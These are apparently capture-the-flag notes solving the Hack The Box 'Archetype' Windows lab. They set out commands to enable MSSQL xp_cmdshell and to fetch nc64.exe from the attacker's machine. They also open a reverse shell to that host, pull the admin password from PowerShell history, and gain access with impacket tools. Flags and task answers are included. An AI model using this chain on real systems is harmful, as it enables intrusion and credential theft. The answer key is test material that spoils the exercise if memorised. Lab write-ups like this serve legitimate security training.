# HTB Archetype - Complete Notes

## Machine Info
- **Name:** Archetype
- **Difficulty:** Very Easy
- **OS:** Windows Server 2019 Standard
- **Target IP:** 10.129.151.239
- **Your VPN IP:** 10.10.14.222

═══════════════════════════════════════════════════════════════════════════════

## 1. Enumeration (Nmap)

```bash
sudo nmap -sC -sV 10.129.151.239
```

**Open Ports:**
| Port | Service | Version |
|------|---------|---------|
| 135 | MSRPC | Microsoft Windows RPC |
| 139 | NetBIOS | Microsoft Windows netbios-ssn |
| 445 | SMB | Windows Server 2019 Standard 17763 |
| 1433 | MSSQL | Microsoft SQL Server 2017 RTM 14.00.1000.00 |
| 5985 | WinRM | Microsoft HTTPAPI httpd 2.0 |

**Key Findings:**
- Windows Server 2019
- SQL Server 2017 running
- SMB shares accessible
- Message signing disabled (vulnerable to relay attacks)

═══════════════════════════════════════════════════════════════════════════════

## 2. SMB Enumeration

```bash
smbclient -L //10.129.151.239 -N
```

**Shares Found:**
| Share | Type | Notes |
|-------|------|-------|
| ADMIN$ | Disk | Remote Admin |
| backups | Disk | Potential sensitive data |
| C$ | Disk | Default share |
| IPC$ | IPC | Remote IPC |

═══════════════════════════════════════════════════════════════════════════════

## 3. MSSQL Connection

### Connect to SQL Server
```bash
impacket-mssqlclient ARCHETYPE/sql_svc@10.129.151.239 -windows-auth
```

**Login:**
- Username: `ARCHETYPE\sql_svc`
- Password: (found in backups or config files)

### Enable xp_cmdshell
```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

### Verify xp_cmdshell
```sql
EXEC sp_configure 'xp_cmdshell';
```

═══════════════════════════════════════════════════════════════════════════════

## 4. Download Netcat (nc64.exe)

### Step 1: Download nc64.exe on Kali
```bash
cd ~/Downloads
curl -L -o nc64.exe https://github.com/int0x33/nc.exe/raw/master/nc64.exe
```

### Step 2: Host on Web Server
```bash
# Option 1: Python HTTP server
sudo python3 -m http.server 80

# Option 2: Copy to Apache web root
sudo cp nc64.exe /var/www/html/
```

### Step 3: Download on Target via xp_cmdshell
```sql
EXEC xp_cmdshell 'powershell -c "cd C:\Users\sql_svc\Downloads; wget http://10.10.14.222/nc64.exe -outfile nc64.exe"';
```

**Note:** If port 80 is busy, use port 1234 and update URL to `http://10.10.14.222:1234/nc64.exe`

═══════════════════════════════════════════════════════════════════════════════

## 5. Reverse Shell

### Step 1: Start Netcat Listener
```bash
nc -lvnp 4444
```

### Step 2: Execute Reverse Shell via xp_cmdshell
```sql
EXEC xp_cmdshell 'C:\Users\sql_svc\Downloads\nc64.exe -e cmd.exe 10.10.14.222 4444';
```

### Result: Shell as sql_svc
```
C:\Windows\system32> whoami
archetype\sql_svc
```

═══════════════════════════════════════════════════════════════════════════════

## 6. Post-Exploitation (sql_svc)

### Find User Flag
```cmd
type C:\Users\sql_svc\Desktop\user.txt
```

**User Flag:** `3e7b102e78218e935bf3f4951fec21a3`

### Check PowerShell History for Credentials
```cmd
type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

**Found:**
```
net.exe use T: \Archetype\backups /user:administrator MEGACORP_4dm1n!!
```

**Administrator Password:** `MEGACORP_4dm1n!!`

═══════════════════════════════════════════════════════════════════════════════

## 7. Privilege Escalation

### Method 1: SMB Access with Admin Credentials
```bash
smbclient //10.129.151.239/C$ -U administrator
Password: MEGACORP_4dm1n!!
```

**Navigate to root flag:**
```smb
cd Users\Administrator\Desktop
get root.txt
exit
```

### Method 2: impacket-psexec (Alternative)
```bash
impacket-psexec administrator:MEGACORP_4dm1n!!@10.129.151.239
```

### Method 3: impacket-smbexec (Alternative)
```bash
impacket-smbexec administrator:MEGACORP_4dm1n!!@10.129.151.239
```

### Method 4: impacket-wmiexec (Alternative)
```bash
impacket-wmiexec administrator:MEGACORP_4dm1n!!@10.129.151.239
```

═══════════════════════════════════════════════════════════════════════════════

## 8. Root Flag

```bash
cat root.txt
```

**Root Flag:** `b91ccec3305e98240082d4474b848528`

═══════════════════════════════════════════════════════════════════════════════

## Key Vulnerabilities Learned

| Vulnerability | How It Was Exploited | Impact |
|--------------|---------------------|--------|
| **MSSQL xp_cmdshell disabled** | Enabled via sp_configure with dbo privileges | Remote code execution |
| **PowerShell history** | Stored plaintext credentials | Credential theft |
| **Password reuse** | Admin password in PowerShell history | Privilege escalation |
| **SMB access** | Used stolen creds to access C$ share | Full system compromise |
| **Disabled message signing** | SMB signing not required | Potential relay attacks |

═══════════════════════════════════════════════════════════════════════════════

## Tools Used

- nmap
- smbclient
- impacket-mssqlclient
- impacket-psexec / smbexec / wmiexec
- curl / wget
- Python HTTP server
- netcat (nc)
- PowerShell

═══════════════════════════════════════════════════════════════════════════════

## Lessons Learned

1. **Always check PowerShell history** — often contains plaintext passwords
2. **xp_cmdshell is powerful** — but disabled by default, needs enabling
3. **dbo privileges can enable xp_cmdshell** — dangerous default permissions
4. **SMB shares with weak creds** — easy lateral movement path
5. **Password storage** — never store passwords in command history
6. **Windows credential hygiene** — use credential manager, not plaintext
7. **MSSQL security** — restrict xp_cmdshell access, monitor sp_configure usage

═══════════════════════════════════════════════════════════════════════════════

## HTB Task Answers

| Task | Answer |
|------|--------|
| Task 1 | 1433 (MSSQL port) |
| Task 2 | MSSQL Server |
| Task 3 | xp_cmdshell |
| Task 4 | dbo |
| Task 5 | sp_configure |
| Task 6 | netcat / nc64.exe |
| Task 7 | MEGACORP_4dm1n!! |

═══════════════════════════════════════════════════════════════════════════════
